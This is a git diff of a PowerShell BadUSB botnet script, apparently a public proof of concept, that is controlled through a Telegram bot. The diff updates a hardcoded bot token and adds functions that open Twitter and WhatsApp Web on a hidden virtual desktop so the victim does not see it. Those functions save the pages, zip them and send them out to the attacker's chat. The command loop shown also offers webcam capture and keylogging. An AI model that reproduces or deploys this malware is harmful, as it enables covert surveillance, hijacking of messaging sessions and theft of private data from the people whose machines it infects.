@@ -21,7 +21,7 @@ BOT TELEGRAM:
 ## CONFIG ##
 ############
 
-$BotToken = "684213907:AAGVcJaYoOXwJneXQWbUq_pzUaw3Po4_yUY"
+$BotToken = "684213907:AAGtz9vSH7bifIZ7SsWH82JEhYO95FCNBdY"
 $ChatID = '-255522090'
 $githubScript = 'https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'
 
@@ -250,6 +250,7 @@ function HackTwitterW10 {
         https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
     #>
 
+
     # Inicia un virtual desktop.
     $KeyShortcut = Add-Type -MemberDefinition @"
 [DllImport("user32.dll")]
@@ -268,9 +269,9 @@ public static void CreateVirtualDesktopInWin10()
     keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
 }
 
-"@ -Name CreateVirtualDesktop -UsingNamespace System.Threading -PassThru
+"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
    
-    # Cambia al virtual desktop de la izquierda.
+    # Cambia al virtual desktop de la iquierda.
     $KeyShortcut2 = Add-Type -MemberDefinition @"
 [DllImport("user32.dll")]
 static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
@@ -308,7 +309,6 @@ public static void SwitchRightVirtualDesktopInWin10()
 }
 "@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    
 
-    
     $KeyShortcut::CreateVirtualDesktopInWin10()
     
     # Inicia el navegador por defecto y abre twitter.
@@ -327,19 +327,118 @@ public static void SwitchRightVirtualDesktopInWin10()
     $wshell.SendKeys("^{s}") 
     $wshell.AppActivate('Guardar como')
     Sleep -Seconds 2 
+    $wshell.SendKeys('t') 
+    Sleep -Seconds 1 
     $wshell.SendKeys('~') 
     $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
+
+    Sleep -Seconds 5
+    Add-Type -assembly "system.io.compression.filesystem"
+    [io.compression.zipfile]::CreateFromDirectory("C:\Users\$env:username\Downloads\w_files", "C:\Users\$env:username\Downloads\t_files.zip") 
+
+    Sleep -Seconds 5
+    download "C:\Users\$env:username\Downloads\t.html"
+    download "C:\Users\$env:username\Downloads\t_files.zip"
+
 }
 
-function hackWhatsAPP {
-    $mainBrowser = mainBrowser
-    turnOffScreen
-    Start-Process $mainBrowser -ArgumentList "https://web.whatsapp.com/" #-WindowStyle Hidden
+function hackWhatsAPPW10 {
+   <#
+    Creará un nuevo dekstop virtual e iniciará ahí el firefox y guardará el html, como es un desktop virtual el usuario no se enterará de lo que pasa
+    Esta funcion solo es válida para W10.
+    Manuales: 
+        https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes 
+    #>
 
-    Start-Sleep -Seconds 10
 
-    screenshot
-    sendPhoto
+    # Inicia un virtual desktop.
+    $KeyShortcut = Add-Type -MemberDefinition @"
+[DllImport("user32.dll")]
+static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+//WIN + CTRL + D: Create a new desktop
+public static void CreateVirtualDesktopInWin10()
+{
+    //Key down
+    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
+    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
+    keybd_event((byte)0x44, 0, 0, UIntPtr.Zero); //D
+    //Key up
+    
+    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x44, 0, (uint)0x2, UIntPtr.Zero);
+}
+
+"@ -Name CreateVirtualDesktop2 -UsingNamespace System.Threading -PassThru
+   
+    # Cambia al virtual desktop de la iquierda.
+    $KeyShortcut2 = Add-Type -MemberDefinition @"
+[DllImport("user32.dll")]
+static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+//WIN + CTRL + LEFT: Switch desktop
+public static void SwitchLeftVirtualDesktopInWin10()
+{
+    //Key down
+    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
+    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
+    keybd_event((byte)0x25, 0, 0, UIntPtr.Zero); //LEFT
+    //Key up
+    
+    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x25, 0, (uint)0x2, UIntPtr.Zero);
+}
+"@ -Name SwitchLeftVirtualDesktop -UsingNamespace System.Threading -PassThru    
+
+    # Cambia al virtual desktop de la derecha.
+    $KeyShortcut3 = Add-Type -MemberDefinition @"
+[DllImport("user32.dll")]
+static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+//WIN + CTRL + LEFT: Switch desktop
+public static void SwitchRightVirtualDesktopInWin10()
+{
+    //Key down
+    keybd_event((byte)0x5B, 0, 0, UIntPtr.Zero); //Left Windows key 
+    keybd_event((byte)0x11, 0, 0, UIntPtr.Zero); //CTRL
+    keybd_event((byte)0x27, 0, 0, UIntPtr.Zero); //RIGHT
+    //Key up
+    
+    keybd_event((byte)0x5B, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x11, 0, (uint)0x2, UIntPtr.Zero);
+    keybd_event((byte)0x27, 0, (uint)0x2, UIntPtr.Zero);
+}
+"@ -Name SwitchRightVirtualDesktop -UsingNamespace System.Threading -PassThru    
+
+    $KeyShortcut::CreateVirtualDesktopInWin10()
+    
+    # Inicia el navegador por defecto y abre twitter.
+    $mainBrowser = mainBrowser 
+    Start-Process $mainBrowser -ArgumentList '--new-window https://web.whatsapp.com/' 
+    Start-Sleep -Seconds 2
+    $wshell = New-Object -ComObject wscript.shell
+    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
+
+    # Espera 10 segundos a cargar completamente la página
+    Start-sleep -Seconds 10
+
+    # Activa la ventana con el nombre: 'Iniciar sesión en Twitter'
+    $KeyShortcut3::SwitchRightVirtualDesktopInWin10()
+    $wshell.AppActivate('(2) WhatsApp') 
+    $wshell.SendKeys("^{s}") 
+    $wshell.AppActivate('Guardar como')
+    Sleep -Seconds 2 
+    $wshell.SendKeys('w') 
+    Sleep -Seconds 1 
+    $wshell.SendKeys('~') 
+    $KeyShortcut2::SwitchLeftVirtualDesktopInWin10()
+
+    Sleep -Seconds 5
+    Add-Type -assembly "system.io.compression.filesystem"
+    [io.compression.zipfile]::CreateFromDirectory("C:\Users\$env:username\Downloads\w_files", "C:\Users\$env:username\Downloads\w_files.zip") 
+
+    Sleep -Seconds 5
+    download "C:\Users\$env:username\Downloads\w.html"
+    download "C:\Users\$env:username\Downloads\w_files.zip"
 }
 
 
@@ -483,14 +582,14 @@ While ($DoNotExit)  {
         $FileToDownload = ($LastMessageText -split ("/download $ipV4 "))[1]
         download $FileToDownload
       }
-      "/hackTwitter $ipV4"{
-        hackTwitter
+      "/hackT $ipV4"{
+        HackTwitterW10
       }
       "/webcam $ipV4"{
         webcam
       }
-      "/hackWhatsAPP $ipV4"{
-        hackWhatsAPP
+      "/hackW $ipV4"{
+        hackWhatsAPPW10
       }
       "/keylogger $ipV4 *"{
         $time = ($LastMessageText -split ("/keylogger $ipV4 "))[1]
